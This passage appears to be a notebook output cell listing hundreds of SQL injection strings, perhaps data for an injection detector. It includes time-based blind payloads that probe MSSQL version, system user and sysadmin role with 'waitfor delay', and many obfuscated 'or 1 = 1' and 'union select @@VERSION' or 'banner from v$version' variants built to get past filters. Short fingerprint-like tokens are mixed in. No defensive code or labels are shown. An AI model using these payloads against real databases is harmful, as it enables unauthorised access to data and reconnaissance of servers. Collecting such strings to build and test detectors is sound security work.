              " \"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --\",\n",
              " \"'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --\",\n",
              " \"'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- \",\n",
              " \"'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --\",\n",
              " \"'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --\",\n",
              " ' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\.<\\\\ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \\\\.<1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \\\\.<1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\.<\\\\ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\.<$ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \\\\.<$ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\.<  = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1   or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \\\\+<\\\\ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \\\\+<\\\\ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\+<$ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or $<\\\\ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or $<\\\\. or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or $<\\\\. union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or $<\\\\ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or $+<\\\\ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or $+<\\\\ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\<\\\\. or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \\\\<\\\\. union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\<1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \\\\<1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\<\\\\ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\<\\\\ union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\<$ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \\\\<$ union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or \\\\<  = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \\\\<  = 1 union select 1,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 or !<@ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or !<@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or @`\\\\` union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 + ( \\\\ )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + ( \\\\ )  union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1.&&1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1. or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1.&&@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 +  ( \\\\. )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 +  ( \\\\. )  union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1.  union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1.  union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1. union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 +\\\\. union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1. <@ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1.<@. or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1.<@. union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1.*1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1.<1# union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1. <@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1.*\\\\ union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1.<@$ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1.<@$ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1.%@ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1.%@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 +1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 11<1# union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 +  ( \\\\+ )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 +  ( \\\\+ )  union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 +\\\\+. union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 -1<@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 +1<@ union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 + \\\\+%\\\\ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + \\\\+%1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + \\\\+%1 union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 + \\\\+*\\\\ union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 + \\\\+%$ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + \\\\+*$ union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 union select 1||1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1||@,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1 1$,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1 $,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1 1a,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1<@$,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 union select .1_,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1`\\\\`,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 union select .1$_,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1<@,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1<@.,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select 1 $$,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select !<1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select +!<1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select +!<@,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select !<@,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @||1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @&&@,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @ 1$,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select  @ $,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @ 1a,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @<@$,version (  )  -- 1',\n",
              " ' select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 union select @ _,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @ $_,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @<@,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @<@.,version (  )  -- 1',\n",
              " ' select * from users where id = 1 union select @ $$,version (  )  -- 1',\n",
              " ' select * from users where id = 1 +$ . or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 +$ . union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 +$ 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 +$+ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 +$+. or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 +$+. union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 +$+ union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 + $+%\\\\ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + $+%1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 + $+*\\\\ union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 + $+%$ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 <@ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 % ( \\\\ )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 * ( \\\\ )  union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 % ( $ )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 % ( @ )  or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 <@. or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 <@.. or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1<@.. union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 <@. union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 *\\\\. union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 <@.$ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 <@.$ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 *1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1 <1## union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 <@1$ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 <@1$ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 *\\\\ union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 <@$ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 %$ . or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 *$ . union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 %$ 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1',\n",
              " ' select * from users where id = 1 <@$_ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 <@$_ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 <@<@ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 %!<1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
              " ' select * from users where id = 1<@<@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 <@<@ union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 %!<@ or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 <@&@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 <@$$ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 &@ or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\.<\\\\ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\.<1 union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\.<\\\\ union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\.<$ union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\.<  = 1 union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
              " \" select * from users where id = '1'   or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or $<\\\\ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or $<\\\\. union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or $<\\\\ union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\<\\\\. or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\<\\\\. union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\<1 or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\<\\\\ union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\<$ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\<$ union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or \\\\<  = 1 union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' or !<@ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'\",\n",
              " ' select * from users where id = 1 or \" (  ) \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ( ,\" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ( .\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ( 1\" or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \" ( ;\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ( ]\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\" (  union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\" (  union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\" (  union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\" (  union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \" ( #\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ( [\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ( _\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or @#\" (  = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or @#\" (  = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \" ( &\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ( @\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ( {\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" )  ( \" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ) ,\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ) .\" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ) 1\" or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \" ) ;\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ) ]\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ) [\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ) $\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ) @\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \" ) {\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \", ( \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \", ) \" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \",,\" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \",.\" or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \",;\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \",?\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\", union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\", union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\", union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\", union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \",#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\", = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or @#\", = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \",&\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \",{\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \". ( \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \". ) \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \".,\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"..\" = 1 or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \".;\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \".]\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\". union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\". union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\". union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\". union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \".#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \".[\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"._\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or @#\". = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\". = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \".%\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \".@\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \".{\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"1 ( \" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"1 ) \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"1,\" or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \"1;\" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"1]\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"1 union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"1 union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"1 union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \"1#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"1[\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"1_\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"1&\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"1{\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = \\'1\\' or \"\"<@ union select 1,version (  )  -- 1\\'',\n",
              " '&1c',\n",
              " ' ( s',\n",
              " ' ) s',\n",
              " ',s',\n",
              " '.s',\n",
              " '1s',\n",
              " ';s',\n",
              " '?s',\n",
              " 'UE1',\n",
              " 'UEf',\n",
              " 'UEs',\n",
              " 'UEv',\n",
              " 'c',\n",
              " 'n',\n",
              " 'ns',\n",
              " 'os',\n",
              " 's',\n",
              " 'v',\n",
              " '{s',\n",
              " ' select * from users where id = 1 or 1#\"; or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"; ( \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"; ) \" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \";,\" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \";.\" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \";1\" or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \";]\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"; union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"; union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"; union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"; union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \";#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \";[\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \";_\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or @#\"; = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"; = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \";&\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = \\'1\\' union select \";\"_,version (  )  -- 1\\'',\n",
              " ' select * from users where id = 1 or \";@\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \";{\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"? or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"? ( \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"] ) \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"?,\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = \\'1\\' union select $[\"],@@VERSION -- 1\\'',\n",
              " ' select * from users where id = 1 or \"].\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"]1\" or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \"?;\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"??\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"? union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"? union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"? union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"? union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \"?#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"?[\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"?_\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"? = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"? = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \"?%\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = \\'1\\' union select \"?\"_,version (  )  -- 1\\'',\n",
              " ' select * from users where id = 1 or \"?@\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"]{\" or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1' union select ||/1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' union select  ( \\\\ ) ,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select  ( \\\\. ) ,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'\",\n",
              " \" select * from users where id = '1' union select \\\\,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select \\\\.,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select \\\\.#,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select \\\\.%1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
              " \" select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'\",\n",
              " ' select * from users where id = \\'1\\' union select 1\"!\",banner from v$version where rownum = 1 -- 1\\'',\n",
              " \" select * from users where id = '1' union select \\\\#,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select $ .,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select $ _,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select $*$,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select +\\\\,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select +\\\\.,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select !<1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' union select +\\\\#,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' union select !<@,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' union select @ 1,version (  )  --  1'\",\n",
              " \" select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'\",\n",
              " \" select * from users where id = '1' union select @ @1,version (  )  --  1'\",\n",
              " ' select * from users where id = 1 or \"\\\\#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"$ ( \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"_ ) \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = \\'1\\' union select \"[\"_,version (  )  -- 1\\'',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \"_;\" or 1 = 1 -- 1',\n",
